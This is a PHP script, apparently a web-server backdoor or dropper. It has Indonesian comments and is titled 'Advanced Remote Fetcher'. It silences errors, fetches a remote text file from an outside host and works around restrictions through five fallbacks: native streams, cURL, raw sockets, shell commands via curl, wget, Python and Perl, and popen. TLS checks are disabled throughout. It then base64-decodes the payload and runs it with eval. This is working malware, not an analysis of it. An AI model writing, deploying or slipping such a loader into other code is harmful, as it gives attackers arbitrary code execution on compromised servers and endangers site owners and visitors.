<?php
/**
 * Advanced Remote Fetcher
 * Integrity: High | Fallback: Aggressive | Type: Auto-Switching
 */

error_reporting(0);
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', -1);

// Configuration
$u = 'https://stepmomhub.com/33.txt';
$ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
$c = false;

/**
 * LAYER 1: Native PHP Stream
 * Metode standar menggunakan file_get_contents dengan manipulasi header.
 */
if (!$c) {
    $opts = [
        "http" => [
            "method" => "GET",
            "header" => "User-Agent: $ua\r\n" . 
                        "Accept: */*\r\n" . 
                        "Connection: close\r\n",
            "timeout" => 15,
            "ignore_errors" => true
        ],
        "ssl" => [
            "verify_peer" => false,
            "verify_peer_name" => false
        ]
    ];
    $context = stream_context_create($opts);
    $c = @file_get_contents($u, false, $context);
}

/**
 * LAYER 2: PHP cURL Extension
 * Metode paling stabil jika ekstensi cURL aktif.
 */
if (!$c && function_exists('curl_init')) {
    $ch = curl_init($u);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT      => $ua,
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_CONNECTTIMEOUT => 10
    ]);
    $c = curl_exec($ch);
    curl_close($ch);
}

/**
 * LAYER 3: Low-Level Socket (fsockopen)
 * Bypasses allow_url_fopen restrictions.
 */
if (!$c && function_exists('fsockopen')) {
    $p = parse_url($u);
    $host = $p['host'];
    $uri = $p['path'] . (isset($p['query']) ? '?' . $p['query'] : '');
    $port = ($p['scheme'] === 'https') ? 443 : 80;
    $prefix = ($p['scheme'] === 'https') ? 'ssl://' : '';
    
    $fp = @fsockopen($prefix . $host, $port, $err, $err_str, 15);
    if ($fp) {
        $req = "GET $uri HTTP/1.1\r\n";
        $req .= "Host: $host\r\n";
        $req .= "User-Agent: $ua\r\n";
        $req .= "Connection: Close\r\n\r\n";
        fwrite($fp, $req);
        
        $resp = '';
        while (!feof($fp)) {
            $resp .= fgets($fp, 2048);
        }
        fclose($fp);
        
        // Memisahkan Header dan Body
        $parts = explode("\r\n\r\n", $resp, 2);
        if (isset($parts[1])) {
            $c = $parts[1];
        }
    }
}

/**
 * LAYER 4: System Shell Execution (Multi-Binary)
 * Mencoba berbagai binary sistem operasi jika PHP dibatasi.
 */
if (!$c && (function_exists('shell_exec') || function_exists('exec') || function_exists('passthru') || function_exists('system'))) {
    // Daftar perintah eksternal (Prioritas: Curl -> Wget -> Fetch -> Python -> Perl -> PHP CLI)
    $methods = [
        "curl -s -k -L -A '$ua' \"$u\"",
        "wget -q -U '$ua' --no-check-certificate -O- \"$u\"",
        "fetch -o - \"$u\"",
        "python3 -c \"import urllib.request; req=urllib.request.Request('$u',headers={'User-Agent':'$ua'}); print(urllib.request.urlopen(req).read().decode('utf-8'))\"",
        "python -c \"import urllib2; req=urllib2.Request('$u',headers={'User-Agent':'$ua'}); print urllib2.urlopen(req).read()\"",
        "perl -mLWP::Simple -e \"getprint '$u'\"",
        "php -r \"echo file_get_contents('$u');\""
    ];

    foreach ($methods as $method) {
        // Menggunakan shell_exec sebagai wrapper utama
        if (function_exists('shell_exec')) {
            $result = @shell_exec($method . " 2>/dev/null");
            if ($result && strlen($result) > 5) { // Validasi panjang minimal
                $c = $result;
                break;
            }
        }
        // Fallback ke exec jika shell_exec mati
        elseif (function_exists('exec')) {
            $out = [];
            @exec($method . " 2>/dev/null", $out);
            if (!empty($out)) {
                $c = implode("\n", $out);
                break;
            }
        }
    }
}

/**
 * LAYER 5: Process Pipe (popen)
 * Alternatif stream jika exec standar diblokir.
 */
if (!$c && function_exists('popen')) {
    $handle = @popen("curl -s -k -L \"$u\" 2>&1", 'r');
    if ($handle) {
        $read = '';
        while (!feof($handle)) {
            $read .= fread($handle, 2048);
        }
        pclose($handle);
        if (strlen($read) > 5) {
            $c = $read;
        }
    }
}

/**
 * EXECUTION CORE
 * Dekoding cerdas dan eksekusi payload.
 */
if ($c) {
    $c = trim($c);
    
    // Cek apakah konten ter-encode base64
    $d = @base64_decode($c, true);
    
    // Validasi hasil decode: Harus valid base64 DAN mengandung tag PHP
    if ($d !== false && strpos($d, '<?') !== false) {
        $run = $d;
    } else {
        $run = $c;
    }

    // Eksekusi final
    if (!empty($run)) {
        eval('?>' . $run);
    }
}
?>
